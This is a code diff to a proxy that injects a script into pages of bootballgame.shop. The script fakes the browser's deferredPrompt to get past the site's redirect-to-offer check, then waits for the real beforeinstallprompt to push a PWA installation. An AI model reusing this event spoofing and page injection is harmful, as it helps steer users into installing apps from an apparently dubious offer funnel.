@@ -84,46 +84,50 @@ function rewriteBody(body, contentType, proxyHost, proxyOrigin) {
     // ─── Инжекция фейкового deferredPrompt ──────────────────────────────
     // bootballgame.shop JS проверяет window.deferredPrompt != null через 1 сек.
     // Если null → редирект на оффер. Подделываем чтобы показать install page.
-    // При вызове prompt() → используем Web Install API (Chrome 143+, same-origin).
+    // При нажатии "Установить" → ждём реальный beforeinstallprompt до 10 сек.
     const fakePromptScript = `<script>
 (function() {
-  // Фейковый beforeinstallprompt event
+  var realPromptEvent = null;
+  var promptWaiters = [];
+
+  // Фейковый beforeinstallprompt event — заглушка чтобы страница показалась
   var fakeEvent = {
     preventDefault: function() {},
     prompt: function() {
-      // Web Install API (Chrome 143+) — устанавливает PWA same-origin
-      // Manifest на /go/manifest.webmanifest, scope /go/
-      if (navigator.install) {
-        return navigator.install().then(function() {
-          return { outcome: 'accepted', platform: '' };
-        }).catch(function(err) {
-          console.warn('[Proxy] navigator.install() failed:', err);
-          // Fallback: показываем нативный браузерный install prompt
-          // через дефолтный Chrome механизм
-          return { outcome: 'dismissed', platform: '' };
+      // Если реальный beforeinstallprompt уже пришёл — вызываем его
+      if (realPromptEvent) {
+        console.log('[Proxy] Using real beforeinstallprompt');
+        return realPromptEvent.prompt();
+      }
+      // Ждём реальный до 10 секунд
+      console.log('[Proxy] Waiting for real beforeinstallprompt...');
+      return new Promise(function(resolve, reject) {
+        var timeout = setTimeout(function() {
+          console.warn('[Proxy] beforeinstallprompt did not fire in 10s');
+          reject(new Error('Install not available'));
+        }, 10000);
+        promptWaiters.push(function(e) {
+          clearTimeout(timeout);
+          console.log('[Proxy] Got real beforeinstallprompt, calling prompt()');
+          e.prompt().then(resolve).catch(reject);
         });
-      }
-      // Fallback для Chrome < 143: пробуем beforeinstallprompt если он придёт
-      if (window.__realDeferredPrompt) {
-        return window.__realDeferredPrompt.prompt();
-      }
-      console.warn('[Proxy] No install method available');
-      return Promise.resolve({ outcome: 'dismissed', platform: '' });
+      });
     },
-    userChoice: new Promise(function(resolve) {
-      // Резолвится когда реальный prompt завершится
-      window.__resolveUserChoice = resolve;
-    })
+    userChoice: new Promise(function() {})
   };
 
   window.deferredPrompt = fakeEvent;
 
-  // Перехватываем реальный beforeinstallprompt если сработает
+  // Ловим реальный beforeinstallprompt
   window.addEventListener('beforeinstallprompt', function(e) {
     e.preventDefault();
-    window.__realDeferredPrompt = e;
-    // Подменяем фейковый на реальный!
+    realPromptEvent = e;
+    console.log('[Proxy] beforeinstallprompt fired!');
+    // Подменяем фейковый на реальный для будущих обращений
     window.deferredPrompt = e;
+    // Если кто-то уже ждёт prompt — вызываем
+    promptWaiters.forEach(function(cb) { cb(e); });
+    promptWaiters = [];
   });
 })();
 </script>`;
